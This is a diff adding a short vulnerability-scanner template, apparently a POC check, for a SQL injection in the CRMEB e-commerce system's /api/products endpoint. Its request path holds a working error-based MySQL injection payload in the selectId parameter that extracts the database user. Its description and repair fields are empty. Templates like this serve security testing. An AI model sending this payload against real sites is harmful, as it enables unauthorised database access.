@@ -1,0 +1,16 @@
+id:
+info:
+  name: CRMEB开源电商系统api_products SQL注入
+  severity: 4
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /api/products?limit=20&priceOrder=&salesOrder=&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(3550=3550,user()))),0x7e),3550)
+response1:
+  headers:
+  body: localhost
+  code: 200
+requests2:
+response2:
